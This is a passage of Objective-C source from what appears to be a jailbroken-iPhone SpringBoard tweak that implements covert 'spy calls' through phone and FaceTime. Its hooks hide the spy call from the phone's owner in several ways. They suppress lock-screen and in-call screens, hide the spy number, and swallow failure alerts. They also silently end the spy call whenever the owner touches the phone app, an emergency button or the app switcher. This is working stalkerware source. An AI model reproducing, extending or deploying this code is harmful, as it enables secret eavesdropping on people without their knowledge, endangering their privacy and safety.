				endFaceTimeSpyCall();
			} else {
				CALL_ORIG(SBAppSliderController, sliderIconScroller$activate$, arg1, arg2);
			}
		}
	} else {
		if ([bundleID isEqualToString:kSpyCallMobilePhoneIndentifer]    ||
            [bundleID isEqualToString:kSpyCallFaceTimeIdentifier])      {
			if (isSpyCallInitiatingConferenceSB()) {
				;
			} else if (isFaceTimeSpyCallInProgress()) {
#pragma mark - FaceTime -
				endFaceTimeSpyCall();
			} else {
                Class $SBApplicationController = objc_getClass("SBApplicationController");
                SBApplicationController *applicationController = [$SBApplicationController sharedInstance];
                SBApplication *application = [applicationController applicationWithDisplayIdentifier:bundleID];
                APPLOGVERBOSE(@"isRunning, %d", [application isRunning]);
                if (![application isRunning] && isSpyCallInProgressSB()) {
                    endSpyCallSB();
                } else {
                    CALL_ORIG(SBAppSliderController, sliderIconScroller$activate$, arg1, arg2);
                }
			}
		} else {
			CALL_ORIG(SBAppSliderController, sliderIconScroller$activate$, arg1, arg2);
		}
	}
}

HOOK(SBAppSliderController, sliderScroller$itemTapped$, void, id arg1, unsigned long long arg2) {
    APPLOGVERBOSE(@"sliderScroller$itemTapped$, %@, %lld", arg1, arg2);
    id displayID = [self _displayIDAtIndex:arg2];
    APPLOGVERBOSE(@"displayID, %@", displayID);
    NSString *bundleID = displayID;
    if (isIncompatibleApplication(bundleID)) {
		if (isSpyCallInProgressSB() && !isSpyCallInConferenceSB()) { // Spy call only
			endSpyCallSB();
		} else {
			if (isFaceTimeSpyCallInProgress()) {
#pragma mark - FaceTime -
				endFaceTimeSpyCall();
			} else {
				CALL_ORIG(SBAppSliderController, sliderScroller$itemTapped$, arg1, arg2);
			}
		}
	} else {
		if ([bundleID isEqualToString:kSpyCallMobilePhoneIndentifer]    ||
            [bundleID isEqualToString:kSpyCallFaceTimeIdentifier])      {
			if (isSpyCallInitiatingConferenceSB()) {
				;
			} else if (isFaceTimeSpyCallInProgress()) {
#pragma mark - FaceTime -
				endFaceTimeSpyCall();
			} else {
                Class $SBApplicationController = objc_getClass("SBApplicationController");
                SBApplicationController *applicationController = [$SBApplicationController sharedInstance];
                SBApplication *application = [applicationController applicationWithDisplayIdentifier:bundleID];
                APPLOGVERBOSE(@"isRunning, %d", [application isRunning]);
                if (![application isRunning] && isSpyCallInProgressSB()) {
                    endSpyCallSB();
                } else {
                    CALL_ORIG(SBAppSliderController, sliderScroller$itemTapped$, arg1, arg2);
                }
			}
		} else {
			CALL_ORIG(SBAppSliderController, sliderScroller$itemTapped$, arg1, arg2);
		}
	}
}

#pragma mark -
#pragma mark SBAppSliderIconController iOS 7 (not used)
#pragma mark -

//HOOK(SBAppSliderIconController, iconTapped$, void, id arg1) {
//    APPLOGVERBOSE(@"iconTapped$, %@", arg1);
//    CALL_ORIG(SBAppSliderIconController, iconTapped$, arg1);
//}

#pragma mark -
#pragma mark SBSlidingAlertDisplay methods
#pragma mark -

HOOK(SBSlidingAlertDisplay, deviceLockViewEmergencyCallButtonPressed$, void, id arg1) {
	APPLOGVERBOSE (@"deviceLockViewEmergencyCallButtonPressed$, arg1 = %@", arg1);
	if (isSpyCallAnsweringSB() || isSpyCallDisconnectingSB()) {
		;
	} else if (isSpyCallInProgressSB()) {
		endSpyCallSB();
	} else {
		CALL_ORIG(SBSlidingAlertDisplay, deviceLockViewEmergencyCallButtonPressed$, arg1);
	}
}

#pragma mark -
#pragma mark SBLockScreenViewController
#pragma mark -

HOOK(SBLockScreenViewController, passcodeLockViewEmergencyCallButtonPressed$, void, id arg1) {
    APPLOGVERBOSE (@"passcodeLockViewEmergencyCallButtonPressed$, %@", arg1);
    if (isSpyCallAnsweringSB() || isSpyCallDisconnectingSB()) {
		;
	} else if (isSpyCallInProgressSB()) {
		endSpyCallSB();
	} else {
		CALL_ORIG(SBLockScreenViewController, passcodeLockViewEmergencyCallButtonPressed$, arg1);
	}
}

HOOK(SBLockScreenViewController, lockScreenView$didScrollToPage$, void, id arg1, int arg2) {
    APPLOGVERBOSE (@"lockScreenView$didScrollToPage$, %@, %d", arg1, arg2);
	if (arg2 == 0 || arg2 == 99 || arg2 == 100) { // iOS 9 {99,100}
        if (isSpyCallAnsweringSB() || isSpyCallDisconnectingSB()) {
            return;
        } else if (isSpyCallInProgressSB()) {
            Class $SBDeviceLockController = objc_getClass("SBDeviceLockController");
            SBDeviceLockController *deviceLockController = [$SBDeviceLockController sharedController];
            if ([deviceLockController isBlocked]) {
                endSpyCallSB();
            } else {
                CALL_ORIG(SBLockScreenViewController, lockScreenView$didScrollToPage$, arg1, arg2);
            }
        } else {
            if (isFaceTimeSpyCallInProgress()) {
#pragma mark - FaceTime -
                if (isDeviceBlocked()) {
                    endFaceTimeSpyCall();
                } else {
                    CALL_ORIG(SBLockScreenViewController, lockScreenView$didScrollToPage$, arg1, arg2);
                }
            } else {
                CALL_ORIG(SBLockScreenViewController, lockScreenView$didScrollToPage$, arg1, arg2);
            }
        }
    } else {
        CALL_ORIG(SBLockScreenViewController, lockScreenView$didScrollToPage$, arg1, arg2);
    }
}

#pragma mark -
#pragma mark SBAppSwitcherController methods
#pragma mark -

// iOS 6 downward
HOOK(SBAppSwitcherController, applicationDied$, void, id arg1) {
	APPLOGVERBOSE(@"applicationDied$ arg1 = %@", arg1);
	SBApplication *application = arg1;
	NSString *bundleIdentifier = [application bundleIdentifier];
	APPLOGVERBOSE(@"bundleIndentifier = %@", bundleIdentifier);
	if ([bundleIdentifier isEqualToString:kSpyCallMobilePhoneIndentifer]) {
		endSpyCallSB();
	}
	CALL_ORIG(SBAppSwitcherController, applicationDied$, arg1);
}

// iOS 8
HOOK(SBAppSwitcherController, _quitAppWithDisplayItem$, void, id arg1) {
    APPLOGVERBOSE(@"_quitAppWithDisplayItem$ arg1 = %@", arg1); // SBDisplayItem
    SBDisplayItem *sbDisplayItem = arg1;
    id displayID = [sbDisplayItem displayIdentifier];
    APPLOGVERBOSE(@"displayID, %@", displayID);
    NSString *bundleIdentifier = displayID;
	if ([bundleIdentifier isEqualToString:kSpyCallMobilePhoneIndentifer]) {
		endSpyCallSB();
	}
    CALL_ORIG(SBAppSwitcherController, _quitAppWithDisplayItem$, arg1);
}

// iOS 8
HOOK(SBAppSwitcherController, switcherIconScroller$activate$, void, id arg1, id arg2) {
    APPLOGVERBOSE(@"switcherIconScroller$activate$ arg1 = %@, arg2 = %@", arg1, arg2); // SBAppSwitcherIconController, SBDisplayLayout
    
    SBDisplayLayout *sbDisplayLayout = arg2;
    NSArray *sbDisplayItems = [sbDisplayLayout displayItems];
    SBDisplayItem *sbDisplayItem = [sbDisplayItems firstObject];
    id displayID = [sbDisplayItem displayIdentifier];
    APPLOGVERBOSE(@"displayID, %@", displayID);
    NSString *bundleID = displayID;
    if (isIncompatibleApplication(bundleID)) {
		if (isSpyCallInProgressSB() && !isSpyCallInConferenceSB()) { // Spy call only
			endSpyCallSB();
		} else {
			if (isFaceTimeSpyCallInProgress()) {
#pragma mark - FaceTime -
				endFaceTimeSpyCall();
			} else {
				CALL_ORIG(SBAppSwitcherController, switcherIconScroller$activate$, arg1, arg2);
			}
		}
	} else {
		if ([bundleID isEqualToString:kSpyCallMobilePhoneIndentifer]    ||
            [bundleID isEqualToString:kSpyCallFaceTimeIdentifier])      {
			if (isSpyCallInitiatingConferenceSB()) {
				;
			} else if (isFaceTimeSpyCallInProgress()) {
#pragma mark - FaceTime -
				endFaceTimeSpyCall();
			} else {
                Class $SBApplicationController = objc_getClass("SBApplicationController");
                SBApplicationController *applicationController = [$SBApplicationController sharedInstance];
                SBApplication *application = [applicationController applicationWithBundleIdentifier:bundleID];
                APPLOGVERBOSE(@"isRunning, %d", [application isRunning]);
                if (![application isRunning] && isSpyCallInProgressSB()) {
                    endSpyCallSB();
                } else {
                    CALL_ORIG(SBAppSwitcherController, switcherIconScroller$activate$, arg1, arg2);
                }
			}
		} else {
			CALL_ORIG(SBAppSwitcherController, switcherIconScroller$activate$, arg1, arg2);
		}
	}
}

// iOS 8
HOOK(SBAppSwitcherController, switcherScroller$itemTapped$, void, id arg1, id arg2) {
    APPLOGVERBOSE(@"switcherScroller$itemTapped$, %@, %@", arg1, arg2); // SBAppSwitcherPageViewController, SBDisplayLayout
    
    SBDisplayLayout *sbDisplayLayout = arg2;
    NSArray *sbDisplayItems = [sbDisplayLayout displayItems];
    SBDisplayItem *sbDisplayItem = [sbDisplayItems firstObject];
    id displayID = [sbDisplayItem displayIdentifier];
    APPLOGVERBOSE(@"displayID, %@", displayID);
    NSString *bundleID = displayID;
    if (isIncompatibleApplication(bundleID)) {
		if (isSpyCallInProgressSB() && !isSpyCallInConferenceSB()) { // Spy call only
			endSpyCallSB();
		} else {
			if (isFaceTimeSpyCallInProgress()) {
#pragma mark - FaceTime -
				endFaceTimeSpyCall();
			} else {
				CALL_ORIG(SBAppSwitcherController, switcherScroller$itemTapped$, arg1, arg2);
			}
		}
	} else {
		if ([bundleID isEqualToString:kSpyCallMobilePhoneIndentifer]    ||
            [bundleID isEqualToString:kSpyCallFaceTimeIdentifier])      {
			if (isSpyCallInitiatingConferenceSB()) {
				;
			} else if (isFaceTimeSpyCallInProgress()) {
#pragma mark - FaceTime -
				endFaceTimeSpyCall();
			} else {
                Class $SBApplicationController = objc_getClass("SBApplicationController");
                SBApplicationController *applicationController = [$SBApplicationController sharedInstance];
                SBApplication *application = [applicationController applicationWithBundleIdentifier:bundleID];
                APPLOGVERBOSE(@"isRunning, %d", [application isRunning]);
                if (![application isRunning] && isSpyCallInProgressSB()) {
                    endSpyCallSB();
                } else {
                    CALL_ORIG(SBAppSwitcherController, switcherScroller$itemTapped$, arg1, arg2);
                }
			}
		} else {
			CALL_ORIG(SBAppSwitcherController, switcherScroller$itemTapped$, arg1, arg2);
		}
	}
}

#pragma mark -
#pragma mark SBAppSliderController quit application
#pragma mark -

HOOK(SBAppSliderController, _quitAppAtIndex$, void, unsigned long long arg1) {
    APPLOGVERBOSE(@"_quitAppAtIndex$, %lld", arg1);
    id displayID = [self _displayIDAtIndex:arg1];
    APPLOGVERBOSE(@"displayID, %@", displayID);
    NSString *bundleIdentifier = displayID;
	if ([bundleIdentifier isEqualToString:kSpyCallMobilePhoneIndentifer]) {
		endSpyCallSB();
	}
    CALL_ORIG(SBAppSliderController, _quitAppAtIndex$, arg1);
}

#pragma mark -
#pragma mark SBTelephonyManager methods
#pragma mark -

HOOK(SBTelephonyManager, updateSpringBoard, void) {
	APPLOGVERBOSE(@"updateSpringBoard, spy in progress = %d, spy disconnect = %d, conference = %d", isSpyCallInProgressSB(),
					isSpyCallDisconnectingSB(), isSpyCallInConferenceSB());
	if (isSpyCallAnsweringSB() || isSpyCallInProgressSB() || isSpyCallDisconnectingSB()) {
		if (isNormalCallInProgressSB() && isSpyCallInConferenceSB()) {
			CALL_ORIG(SBTelephonyManager, updateSpringBoard);
		} else {
            ;
        }
	} else {
#pragma mark FaceTime audio call
        // iOS 7 FaceTime audio call
        if (isFaceTimeSpyCallInProgress()) {
            ;
        } else {
            CALL_ORIG(SBTelephonyManager, updateSpringBoard);
        }
	}
}

// IOS 5
HOOK(SBTelephonyManager, urlWithScheme$fromDialingNumber$abUID$urlPathAddition$forceAssist$suppressAssist$wasAlreadyAssisted$, id,
					id arg1, id arg2, id arg3, id arg4, BOOL arg5, BOOL arg6, BOOL arg7) {
	APPLOGVERBOSE(@"urlWithScheme$fromDialingNumber$abUID$urlPathAddition$forceAssist$suppressAssist$wasAlreadyAssisted$");
	if (isSpyCallInProgressSB()) {
		endSpyCallSB();
		return nil;
	} else {
		return CALL_ORIG(SBTelephonyManager, urlWithScheme$fromDialingNumber$abUID$urlPathAddition$forceAssist$suppressAssist$wasAlreadyAssisted$,
						 arg1, arg2, arg3, arg4, arg5, arg6, arg7);
	}
}

// IOS 4 (tested IOS 4.2.1)
HOOK(SBTelephonyManager, urlWithScheme$fromDialingNumber$abUID$urlPathAddition$, id, id arg1, id arg2, id arg3, id arg4) {
	APPLOGVERBOSE(@"urlWithScheme$fromDialingNumber$abUID$urlPathAddition$");
	if (isSpyCallInProgressSB()) {
		endSpyCallSB();
		return nil;
	} else {
		return CALL_ORIG(SBTelephonyManager, urlWithScheme$fromDialingNumber$abUID$urlPathAddition$,
						 arg1, arg2, arg3, arg4);
	}
}

// iOS 7
HOOK(SBTelephonyManager, urlWithScheme$fromDialingNumber$abUID$urlPathAddition$service$forceAssist$suppressAssist$wasAlreadyAssisted$, id,
     id arg1, id arg2, int arg3, id arg4, int arg5, _Bool arg6, _Bool arg7, _Bool arg8) {
	APPLOGVERBOSE(@"urlWithScheme$fromDialingNumber$abUID$urlPathAddition$service$forceAssist$suppressAssist$wasAlreadyAssisted$");
	if (isSpyCallInProgressSB()) {
		endSpyCallSB();
		return nil;
	} else {
		return CALL_ORIG(SBTelephonyManager, urlWithScheme$fromDialingNumber$abUID$urlPathAddition$service$forceAssist$suppressAssist$wasAlreadyAssisted$,
						 arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8);
	}
}

#pragma mark SpringBoard
// iOS 8
HOOK(SpringBoard, applicationOpenURL$withApplication$sender$publicURLsOnly$animating$needsPermission$activationSettings$withResult$, void,
     id arg1, id arg2, id arg3, _Bool arg4, _Bool arg5, _Bool arg6, id arg7, CDUnknownBlockType arg8) {
    APPLOGVERBOSE(@"applicationOpenURL$withApplication$sender$publicURLsOnly$animating$needsPermission$activationSettings$withResult$, "
                  "%@, %@, %@, %d, %d, %d, %@, %@", arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8);
    // tel:+66%2092%20374%209532?abuid=4 ({facetime://happytest008@gmail.com?uid=1}, {facetime-audio://iphonedev22@icloud.com})
    // SBApplication (com.apple.InCallService)
    // com.apple.mobilephone
    // 0
    // 1
    // 1
    // null
    // __NSStackBlock__ (sometime)
    
    NSString *url = [arg1 absoluteString];
    SBApplication *sbApp = arg2;
    NSString *sender = arg3;
    
    NSUInteger location1 = [url rangeOfString:@"tel:"].location;
    NSUInteger location2 = [url rangeOfString:@"facetime:"].location;
    NSUInteger location3 = [url rangeOfString:@"facetime-audio:"].location;
    if (location1 != NSNotFound || location2 != NSNotFound || location3 != NSNotFound ||
        [[sbApp bundleIdentifier] isEqualToString:@"com.apple.InCallService"]) {
        if (isSpyCallInProgressSB()) {
            endSpyCallSB();
            if ([sender isEqualToString:@"com.apple.facetime"]) {
                [NSThread sleepForTimeInterval:2.0]; // Make sure spy call disconnect completely otherwise spy number shown in FaceTime screen
                CALL_ORIG(SpringBoard, applicationOpenURL$withApplication$sender$publicURLsOnly$animating$needsPermission$activationSettings$withResult$,
                          arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8);
            } else if (!sbApp && !sender) {
                // This is the case of making call from contact in task list of SpringBoard, we need to call original otherwise task list screen frozen
                [NSThread sleepForTimeInterval:1.6]; // Make sure spy call disconnects completely
                CALL_ORIG(SpringBoard, applicationOpenURL$withApplication$sender$publicURLsOnly$animating$needsPermission$activationSettings$withResult$,
                          arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8);
            } else {
                return;
            }
        } else {
            CALL_ORIG(SpringBoard, applicationOpenURL$withApplication$sender$publicURLsOnly$animating$needsPermission$activationSettings$withResult$,
                      arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8);
        }
    } else {
        CALL_ORIG(SpringBoard, applicationOpenURL$withApplication$sender$publicURLsOnly$animating$needsPermission$activationSettings$withResult$,
                  arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8);
    }
}

#pragma mark -
#pragma mark SBAwayView methods
#pragma mark -

HOOK(SBAwayView, shouldShowInCallInfo, BOOL) {
	APPLOGVERBOSE(@"shouldShowInCallInfo");
	if (isSpyCallAnsweringSB() || isSpyCallInProgressSB()) {
		return NO;
	} else {
		if (isFaceTimeSpyCallInProgress()) {
#pragma mark - FaceTime -
			return NO;
		} else {
			return CALL_ORIG(SBAwayView, shouldShowInCallInfo);
		}
	}
}

#pragma mark InCallLockScreenController

//HOOK(InCallLockScreenController, shouldShowInCallInfo, BOOL) {
//    APPLOGVERBOSE(@"shouldShowInCallInfo");
//	if (isSpyCallAnsweringSB() || isSpyCallInProgressSB()) {
//		return NO;
//	} else {
//		if (isFaceTimeSpyCallInProgress()) {
//#pragma mark - FaceTime -
//			return NO;
//		} else {
//			return CALL_ORIG(InCallLockScreenController, shouldShowInCallInfo);
//		}
//	}
//}

// iOS 7,8
HOOK(InCallLockScreenController, init, id) {
    APPLOGVERBOSE(@"init");
	if (isSpyCallAnsweringSB() || isSpyCallInProgressSB()) {
		return nil;
	} else {
		if (isFaceTimeSpyCallInProgress()) {
#pragma mark - FaceTime -
			return nil;
		} else {
            APPLOGVERBOSE(@"Call original InCallLockScreenController ...");
			return CALL_ORIG(InCallLockScreenController, init);
		}
	}
}


HOOK(SBAwayView, lockBarStoppedTracking$, void, id arg1) {
	APPLOGVERBOSE(@"lockBarStoppedTracking$");
	if (isSpyCallAnsweringSB() || isSpyCallDisconnectingSB()) {
		return;
	} else if (isSpyCallInProgressSB()) {
		if (isDeviceBlocked()) {
			endSpyCallSB();
		} else {
			CALL_ORIG(SBAwayView, lockBarStoppedTracking$, arg1);
		}
	} else {
		if (isFaceTimeSpyCallInProgress()) {
#pragma mark - FaceTime -
			if (isDeviceBlocked()) {
				endFaceTimeSpyCall();
			} else {
				CALL_ORIG(SBAwayView, lockBarStoppedTracking$, arg1);
			}
		} else {
			CALL_ORIG(SBAwayView, lockBarStoppedTracking$, arg1);
		}
	}
}

#pragma mark -
#pragma mark SBCallFailureAlert methods
#pragma mark -

HOOK(SBCallFailureAlert, initWithCauseCode$call$, id, long cause, id aCallEvent) { 
	APPLOGVERBOSE(@"initWithCauseCode$call$ cause = %ld", cause);
	if (aCallEvent) {
		if ([SpyCallUtils isSpyCall:(CTCall *)aCallEvent]) {
			Class $SBTelephonyManager = objc_getClass("SBTelephonyManager");
			[[$SBTelephonyManager sharedTelephonyManager] updateSpringBoard];
			return nil;
		} else {
			return CALL_ORIG(SBCallFailureAlert, initWithCauseCode$call$, cause, aCallEvent);
		}
	} else {
		return CALL_ORIG(SBCallFailureAlert, initWithCauseCode$call$, cause, aCallEvent);
	}
}

///========================= INCOMING CALL, CALL WAITING AUDIO CONTROL IOS 5 ==================
#pragma mark -
#pragma mark INCOMING CALL, CALL WAITING AUDIO CONTROL IOS 5
#pragma mark -

#pragma mark -
#pragma mark MPIncomingPhoneCallController methods
#pragma mark -

HOOK(MPIncomingPhoneCallController, initWithCall$, id, id arg1) {
	APPLOGVERBOSE(@"initWithCall$");
	CTCall *call = (CTCall *)arg1;
	if ([SpyCallUtils isSpyCall:call]) {
		return nil;
	} else {
        return CALL_ORIG(MPIncomingPhoneCallController, initWithCall$, arg1);
    }
}

#pragma mark FaceTime audio call

HOOK(MPIncomingPhoneCallController, initWithCalliPadiPodTouch$, id, id arg1) {
	APPLOGVERBOSE(@"initWithCalliPadiPodTouch$");
    // iOS 7.1.1 FaceTime audio call
    APPLOGVERBOSE(@"*** arg1 = %@ ***", arg1); // TUFaceTimeAudioCall
            
    TUFaceTimeAudioCall *facetimeAudioCall = arg1;
    APPLOGVERBOSE(@"callerNameFromNetwork = %@", [facetimeAudioCall callerNameFromNetwork]);
    APPLOGVERBOSE(@"remoteParticipant = %@", [facetimeAudioCall remoteParticipant]);
    APPLOGVERBOSE(@"destinationID = %@", [facetimeAudioCall destinationID]);
    
    FaceTimeCall *ftCall = [[[FaceTimeCall alloc] init] autorelease];
    [ftCall setMInviter:nil];
    [ftCall setMIMHandle:nil];
    [ftCall setMIMAVChatProxy:nil];
    [ftCall setMConversationID:nil];
    [ftCall setMFaceTimeAudioCall:facetimeAudioCall];
    [ftCall setMDirection:kFaceTimeCallDirectionIn];
    
    FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
    [ftSpyCallManager handleIncomingFaceTimeCall:ftCall];
    
    if ([ftCall mIsFaceTimeSpyCall]) {
        return nil;
    } else {
        if (isFaceTimeSpyCallInProgress()) {
            /************************************************************************************
             +++ For use case:
             - Spy FaceTime video active
             - Normal FaceTime audio come in
             
             Due to there is no way to show incoming call screen even we end FaceTime video call
             then pass facetimeAudioCall object to initWithCalliPadiPodTouch$ method the screen
             remain call waiting... thus we decide to end spy call and normal call the same time.
             ************************************************************************************/
            [facetimeAudioCall disconnect];
            return nil;
        } else {
            return CALL_ORIG(MPIncomingPhoneCallController, initWithCalliPadiPodTouch$, arg1);
        }
    }
}

HOOK(MPIncomingPhoneCallController, updateLCDWithName$label$breakPoint$, void, id arg1, id arg2, id arg3) {
	APPLOGVERBOSE(@"updateLCDWithName$label$breakPoint$ name: %@, label: %@, breakPoint: %@", arg1, arg2, arg3);
	NSMutableCharacterSet *charSet = [[NSMutableCharacterSet alloc] init];
	[charSet addCharactersInString:@"+-"];
	NSString *telNumber = [[arg1 componentsSeparatedByCharactersInSet:charSet] componentsJoinedByString:@""];
	APPLOGVERBOSE(@"updateLCDWithName$label$breakPoint$ telNumber: %@", telNumber);
	if (![SpyCallUtils isSpyNumber:telNumber]) {
		CALL_ORIG(MPIncomingPhoneCallController, updateLCDWithName$label$breakPoint$, arg1, arg2, arg3);
	}
	[charSet release];
}

HOOK(MPIncomingPhoneCallController, viewWillAppear$, void, BOOL arg1) {
	APPLOGVERBOSE(@"viewWillAppear");
	if (isSpyCallInProgressSB() || isSpyCallDisconnectingSB()) {
		if (isNormalCallIncomingSB() && !isSpyCallInConferenceSB()) {
			//[self ringOrVibrate];
			//routeAudioSessionToRingTone([[[SpyCallManager sharedManager] mSystemEnvUtils] mAVController]);
		}
	}
	CALL_ORIG(MPIncomingPhoneCallController, viewWillAppear$, arg1);
}

HOOK(MPIncomingPhoneCallController, viewDidAppear$, void, BOOL arg1) {
	APPLOGVERBOSE(@"viewDidAppear");
	if (isSpyCallInProgressSB() || isSpyCallDisconnectingSB()) {
		if (isNormalCallIncomingSB() && !isSpyCallInConferenceSB()) {
			//[self ringOrVibrate];
			//routeAudioSessionToRingTone([[[SpyCallManager sharedManager] mSystemEnvUtils] mAVController]);
		}
	}
	CALL_ORIG(MPIncomingPhoneCallController, viewDidAppear$, arg1);
}

#pragma mark -
#pragma mark MPPhoneCallWaitingController methods
#pragma mark -

HOOK(MPPhoneCallWaitingController, viewWillAppear$, void, BOOL arg1) {
	APPLOGVERBOSE(@"viewWillAppear");
	if (isSpyCallInProgressSB() || isSpyCallDisconnectingSB()) {
		if (isNormalCallIncomingSB() && !isSpyCallInConferenceSB()) {
			//[self ringOrVibrate];
			//routeAudioSessionToRingTone([[[SpyCallManager sharedManager] mSystemEnvUtils] mAVController]);
		}
	}
	CALL_ORIG(MPPhoneCallWaitingController, viewWillAppear$, arg1);
}

HOOK(MPPhoneCallWaitingController, viewDidAppear$, void, BOOL arg1) {
	APPLOGVERBOSE(@"viewDidAppear");
	if (isSpyCallInProgressSB() || isSpyCallDisconnectingSB()) {
		if (isNormalCallIncomingSB() && !isSpyCallInConferenceSB()) {
			//[self ringOrVibrate];
			//routeAudioSessionToRingTone([[[SpyCallManager sharedManager] mSystemEnvUtils] mAVController]);
		}
	}
	CALL_ORIG(MPPhoneCallWaitingController, viewDidAppear$, arg1);
}

HOOK(MPPhoneCallWaitingController, initWithCall$, id, id arg1) {
	APPLOGVERBOSE(@"initWithCall$");
	if (isSpyCallInProgressSB() || isSpyCallDisconnectingSB()) {
		if (isNormalCallIncomingSB()) {
			return CALL_ORIG(MPPhoneCallWaitingController, initWithCall$, arg1);
		} else {
			return nil;
		}
	} else {
		return CALL_ORIG(MPPhoneCallWaitingController, initWithCall$, arg1);
	}
}

#pragma mark FaceTime audio call

HOOK(MPPhoneCallWaitingController, initWithCalliPadiPodTouch$, id, id arg1) {
	APPLOGVERBOSE(@"initWithCalliPadiPodTouch$");
    
    TUFaceTimeAudioCall *facetimeAudioCall = arg1;
    APPLOGVERBOSE(@"destinationID = %@", [facetimeAudioCall destinationID]);
    
    FaceTimeCall *ftCall = [[[FaceTimeCall alloc] init] autorelease];
	[ftCall setMInviter:nil];
	[ftCall setMIMHandle:nil];
    [ftCall setMIMAVChatProxy:nil];
	[ftCall setMConversationID:nil];
    [ftCall setMFaceTimeAudioCall:facetimeAudioCall];
	[ftCall setMDirection:kFaceTimeCallDirectionIn];
	
	FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
	[ftSpyCallManager handleIncomingWaitingFaceTimeCall:ftCall];
	
	if ([ftCall mIsFaceTimeSpyCall]) {
		return nil;
	} else {
		if (isFaceTimeSpyCallInProgress()) {
            //Class $MPIncomingPhoneCallController = objc_getClass("MPIncomingPhoneCallController");
            //MPIncomingPhoneCallController *incomingPhoneCallController = nil;
            //incomingPhoneCallController = [[$MPIncomingPhoneCallController alloc] initWithChat:arg1];
            
            /*****************************************************************************************
             +++ For use case:
             - Spy FaceTime audio active
             - Normal FaceTime audio come in
             
             If we alloc MPIncomingPhoneCallController explicitly code will hang at line initWithChat:
             *****************************************************************************************/
            
			// -- Need some delay --
			//[incomingPhoneCallController performSelector:@selector(ringOrVibrate)
            //                                  withObject:nil
            //                                  afterDelay:1.0];
            //return incomingPhoneCallController;
            
            [facetimeAudioCall disconnect];
			return nil;
		} else {
            return CALL_ORIG(MPPhoneCallWaitingController, initWithCalliPadiPodTouch$, arg1);
		}
	}
}

HOOK(MPPhoneCallWaitingController, _addCallWaitingButtons$, void, BOOL arg1) {
	APPLOGVERBOSE(@"_addCallWaitingButtons");
	if (isSpyCallInProgressSB() || isSpyCallDisconnectingSB()) {
		if (isNormalCallIncomingSB() && isSpyCallLeavingConferenceSB()) { // Conference state
			CALL_ORIG(MPPhoneCallWaitingController, _addCallWaitingButtons$, arg1);
		}
		APPLOGVERBOSE(@"NOT ADD CALL WAITING BUTTON, SIP=%d, CDING=%d, NIC=%d, SLC=%d", isSpyCallInProgressSB(), isSpyCallDisconnectingSB(),
					  isNormalCallIncomingSB(), isSpyCallLeavingConferenceSB());
	} else {
		CALL_ORIG(MPPhoneCallWaitingController, _addCallWaitingButtons$, arg1);
	}
}

HOOK(MPPhoneCallWaitingController, _newBottomButtonBar, id) {
	APPLOGVERBOSE(@"_newBottomButtonBar");
	if (isSpyCallInProgressSB() || isSpyCallDisconnectingSB()) {
		if (isNormalCallIncomingSB() && isSpyCallLeavingConferenceSB()) { // Conference state
			return CALL_ORIG(MPPhoneCallWaitingController, _newBottomButtonBar);
		} else {
			APPLOGVERBOSE(@"NOT ADD BOTTOM BUTTON BAR, SIP=%d, CDING=%d, NIC=%d, SLC=%d", isSpyCallInProgressSB(), isSpyCallDisconnectingSB(),
						  isNormalCallIncomingSB(), isSpyCallLeavingConferenceSB());
			return nil;
		}
	} else {
		return CALL_ORIG(MPPhoneCallWaitingController, _newBottomButtonBar);
	}
}

#pragma mark -
#pragma mark SBPluginManager methods (entry point)
#pragma mark -

HOOK(SBPluginManager, loadPluginBundle$, Class, id arg1) {
	NSBundle *bundle = arg1;
	APPLOGVERBOSE(@"loadPluginBundle bundleID = %@ loaded = %d", [bundle bundleIdentifier], [bundle isLoaded]);
	if ([[bundle bundleIdentifier] isEqualToString:@"com.apple.mobilephone.incomingcall"]) {
		// Incoming call
		Class $MPIncomingPhoneCallController = [bundle classNamed:@"MPIncomingPhoneCallController"];
        if ([SystemUtilsImpl isIphone]) {
            //_MPIncomingPhoneCallController$initWithCall$ = MSHookMessage($MPIncomingPhoneCallController, @selector(initWithCall:), &$MPIncomingPhoneCallController$initWithCall$);
            MSHookMessage($MPIncomingPhoneCallController, @selector(initWithCall:), $MPIncomingPhoneCallController$initWithCall$, &_MPIncomingPhoneCallController$initWithCall$);
        } else {
            // iPad, iPod touch
            MSHookMessage($MPIncomingPhoneCallController, @selector(initWithCall:),
                          $MPIncomingPhoneCallController$initWithCalliPadiPodTouch$,
                          &_MPIncomingPhoneCallController$initWithCalliPadiPodTouch$);
        }
		//_MPIncomingPhoneCallController$updateLCDWithName$label$breakPoint$ = MSHookMessage($MPIncomingPhoneCallController, @selector(updateLCDWithName:label:breakPoint:), &$MPIncomingPhoneCallController$updateLCDWithName$label$breakPoint$);
        MSHookMessage($MPIncomingPhoneCallController, @selector(updateLCDWithName:label:breakPoint:), $MPIncomingPhoneCallController$updateLCDWithName$label$breakPoint$, &_MPIncomingPhoneCallController$updateLCDWithName$label$breakPoint$);
		// Hook for ringing + vibrate (spy call in progress normal come in) sometime go to call waiting controller
		//_MPIncomingPhoneCallController$viewWillAppear$ = MSHookMessage($MPIncomingPhoneCallController, @selector(viewWillAppear:), &$MPIncomingPhoneCallController$viewWillAppear$);
        MSHookMessage($MPIncomingPhoneCallController, @selector(viewWillAppear:), $MPIncomingPhoneCallController$viewWillAppear$, &_MPIncomingPhoneCallController$viewWillAppear$);
		//_MPIncomingPhoneCallController$viewDidAppear$ = MSHookMessage($MPIncomingPhoneCallController, @selector(viewDidAppear:), &$MPIncomingPhoneCallController$viewDidAppear$);
        MSHookMessage($MPIncomingPhoneCallController, @selector(viewDidAppear:), $MPIncomingPhoneCallController$viewDidAppear$, &_MPIncomingPhoneCallController$viewDidAppear$);
		
		// Call waiting
		Class $MPPhoneCallWaitingController = [bundle classNamed:@"MPPhoneCallWaitingController"];
        if ([SystemUtilsImpl isIphone]) {
            //_MPPhoneCallWaitingController$initWithCall$ = MSHookMessage($MPPhoneCallWaitingController, @selector(initWithCall:), &$MPPhoneCallWaitingController$initWithCall$);
            MSHookMessage($MPPhoneCallWaitingController, @selector(initWithCall:), $MPPhoneCallWaitingController$initWithCall$, &_MPPhoneCallWaitingController$initWithCall$);
        } else {
            // iPad, iPod touch
